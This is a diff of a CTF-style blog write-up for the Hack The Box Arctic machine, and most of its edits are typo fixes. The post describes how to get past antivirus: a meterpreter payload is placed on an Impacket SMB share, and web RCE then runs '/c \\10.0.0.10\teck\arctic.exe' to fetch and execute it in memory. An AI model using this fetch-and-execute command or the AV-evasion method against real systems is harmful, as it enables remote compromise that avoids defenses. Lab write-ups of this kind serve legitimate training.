@@ -10,13 +10,13 @@ categories:
 
 <br>And this is where we can utilise this Weak spot, Consider a scenario where we have a RCE, or OS-command Injection on the Web, for this I am taking the HTB Arctic machine, which fit's perfectly for this situation.
 
-<br>Now as we know that machine have AV because of which we couldn't able to exeute a meterpreter payload, and later we created a Ecnrypted meterpreter with veil evasion.
-<br>With this method we don't need to encode our meterpreter payload, we just need to set up our Impacket smb server and then run the command which will reqest our payload file and run that in the memory, because heuristic detection is off we can easily Bypass it.
+<br>Now as we know that machine have AV because of which we couldn't able to execute a meterpreter payload, and because of that we created a Encrypted meterpreter with veil evasion.
+<br>With this method we don't need to Encrypt our meterpreter payload, we just need to set up our Impacket smb server and then run the command which will request our payload file and run that in the memory, because heuristic detection is off we can easily Bypass it.
 
 <br>**Poc**
-<br>if you have not Done the [Arctic](https://teckk2.github.io/writeup/2017/12/27/Arctic.html) machine, I recomend first follow the steps and reach the step where we have RCE on the web,
+<br>If you have not Done the [Arctic](https://teckk2.github.io/writeup/2017/12/27/Arctic.html) machine, I recommend first follow the steps and reach the step where we have RCE on the web,
 
-<br>First generate the Payload
+<br>Now first generate the Payload
 
 <font size="1">
 <div style="height:150px;width:600px;overflow:auto;background-color:#262626;color:White;scrollbar-base-color:gold;font-family:monospace;padding:10px;">
@@ -49,7 +49,7 @@ categories:
 </div>
 </font>
 <br>In this I am using teck as the remote folder name to represent on the server and my file is in /root/Desktop/
-<br>Now our SMB server is up and runnig now go to the web page and request for the file with the command **{/c \\10.*.*.10\teck\arctic.exe}**.
+<br>Now our SMB server is up and runnig now go to the web page and request for the file with the command **{/c \\10.0.0.10\teck\arctic.exe}**.
 <br> ![SMB-Request](https://teckk2.github.io/assets/images/Arctic/17.PNG)
 <br>Before you execute the command make sure to set up the meterpreter listner
 <br>After executing wait for 30-40 Sec to get the request on the SMB server
